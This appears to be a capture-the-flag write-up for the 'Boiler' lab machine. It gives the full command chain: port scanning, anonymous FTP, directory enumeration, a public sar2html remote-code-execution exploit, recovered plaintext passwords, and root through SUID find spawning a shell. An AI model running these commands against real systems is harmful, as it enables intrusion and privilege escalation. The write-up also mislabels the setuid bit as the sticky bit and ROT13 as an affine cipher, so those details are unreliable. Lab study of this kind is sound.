# Boiler CTF

--------------------------------------------------------------------

## GIVEN INFO

**IP Address**: 10.10.95.133

--------------------------------------------------------------------

## PROCEDURE

```
nmap -sV -sC -p- 10.10.95.133
```

**EXPOSED PORT (SERVICE)**:<br>
    21 (ftp vsftpd 3.0.3),<br>
    80 (http Apache httpd 2.4.18),<br>
    10000 (http MiniServ 1.930 Webmin httpd),<br>
    55007 (ssh OpenSSH 7.2p2)

ftp has anonymous login enabled

```
ftp anonymous@10.10.95.133
ls -la
get .info.txt -
```

Possible substituion cipher<br>
**TEXT**: Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!


Cracked Affine Cipher at https://ciphertools.co.uk/decode.php<br>
**MESSAGE**: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

Try accessing http server at http://10.10.95.133:10000

Need to add new host to /etc/hosts
```
10.10.95.133 ip-10-10-236-122.eu-west-1.compute.internal
```

webmin login page found

Webserver on port 80 is default apache page

```
dirb http://10.10.95.133 /usr/share/wordlists/dirb/common.txt 
```

Found robots.txt, joomla, manual

In robots.txt:
```
/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

Found cipher in http://http://10.10.95.133/joomla/_database:<br>
Lwuv oguukpi ctqwpf.<br>
Same cipher as before: Just messing around.


Found hash in http://http://10.10.95.133/joomla/_files:<br>
VjJodmNITnBaU0JrWVdsemVRbz0K<br>
Double base64 encoded string: Whopsie daisy

http://10.10.95.133/joomla/administrator/ is the admin login page

Found sar2html in http://10.10.95.133/joomla/_test/

This code will allow us to execute code on remote machine
```
searchsploit sar2html
searchsploit -m php/webapps/49344.py
python 49344.py
cat log.txt
```

Found ssh login<br>
**USER**: basterd
**PASS**:superduperp@$$

```
ssh -p55007 basterd@10.10.95.133
```

Found another login in backup.sh<br>
**USER**: stoner
**PASS**: superduperp@$$no1knows

**user.txt**: You made it till here, well done.

```
sudo -l

User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas
nc -lnvp 4444 > linpeas
nc -v 10.10.95.133 < linpeas
chmod +x linpeas
./linpeas
```

We can exploit the /usr/bin/find which is owned by root<br>
Has sticky bit set: -r-sr-xr-x
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**root.txt**: It wasn't that hard, was it?
